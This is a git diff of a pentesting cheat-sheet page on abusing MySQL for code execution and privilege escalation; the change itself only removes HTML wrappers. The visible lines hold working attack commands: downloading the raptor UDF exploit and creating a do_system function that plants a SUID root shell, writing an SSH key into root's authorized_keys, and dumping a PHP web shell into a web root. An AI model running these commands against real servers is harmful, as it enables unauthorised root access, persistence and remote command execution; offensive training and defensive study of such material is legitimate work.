@@ -6,8 +6,6 @@ tags: ["mysql", "database", "RCE", "php", "UDF", "exploit", "pe"]
 
 ### Abuse #1: User Defined Function (UDF)
 
-<div>
-
 ```console
 # Get the raptor_udf2.c
 wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
@@ -69,15 +67,9 @@ create function do_system returns integer soname 'raptor_udf2.so';
 select do_system('cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell');
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Abuse #2: Add ssh public key to root
-
-<div>
 
 ```console
 # Connect to database as root
@@ -98,15 +90,9 @@ show grants for root@localhost;
 select "BASE64_PUB_KEY" into outfile "/root/.ssh/authorized_keys2";
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Abuse #3: Create php File from Database to RCE
-
-<div>
 
 ```console
 create table test(stuff text);
@@ -119,7 +105,3 @@ insert into test values('<?php system($_REQUEST["cmd"]); ?>');
 ```console
 select * from test into dumpfile 'C:\\xampp\\htdocs\\cmd.php';
 ```
-
-</div>
-
-<br>
